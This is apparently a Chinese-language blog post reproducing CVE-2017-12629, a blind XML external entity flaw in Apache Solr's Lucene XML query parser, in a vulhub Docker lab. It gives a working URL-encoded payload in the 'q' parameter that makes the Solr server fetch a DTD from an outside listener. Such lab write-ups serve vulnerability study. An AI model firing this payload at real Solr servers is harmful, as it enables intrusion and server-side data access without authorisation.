---
layout: post
title: Apache solr XML 实体注入漏洞
tags: solr
categories: CVE-2017-12629-XXE
---

# Apache solr XML 实体注入漏洞（CVE-2017-12629-XXE）

## 漏洞描述

这是一个典型XXE漏洞的缺陷编码示例，Lucene包含了一个查询解析器支持XML格式进行数据查询，在调用lucene xml解析器时没有对DTD和外部实体进行禁用处理，造成了Blind XXE。

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。
环境启动后访问`http://your-ip:8983/`即可查看到Apache solr的管理页面，无需登录

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2017-12629-XXE/15936718631855.jpg)

访问如下链接，solr/demo是为了能够创建索引和查询而创建的一个Core，这时候就可以通过参数q在索引文档中进行查询我们想要查询的数据

Core：索引库，其中包含schema.xml/managed-schema，schema.xml是模式文件的传统名称，可以由使用该模式的用户手动编辑，managed-schema是Solr默认使用的模式文件的名称，它支持在运行时动态更改，data-config文件可配置为xml形式或通过请求参数传递（在dataimport开启debug模式时可通过dataConfig参数传递）

`http://127.0.0.1:8983/solr/demo/select?q=demo&wt=xml`

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2017-12629-XXE/15936720453057.jpg)

Lucene包含了一个查询解析器支持XML格式进行数据查询，在调用lucene xml解析器时没有对DTD和外部实体进行禁用处理，造成了Blind XXE。

在本地使用python开启一个web服务，`python2 -m SimpleHTTPServer 8080
`然后访问如下链接，`http://your-ip:8983/solr/demo/select?q={!xmlparser%20v=%27%3C!DOCTYPE%20test%20SYSTEM%20%22http://本地服务IP:8080/xxx%22%3E%3Ca%3E%3C/a%3E%27}&wt=xml`去向本地服务发起请求，没请求一次，本地就会显示一条请求记录

payload:`q={!xmlparser v='<!DOCTYPE test SYSTEM "http://本地服务的ip:端口/">'}&wt=xml`

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2017-12629-XXE/15936752916246.jpg)

## 参考链接

https://paper.seebug.org/425/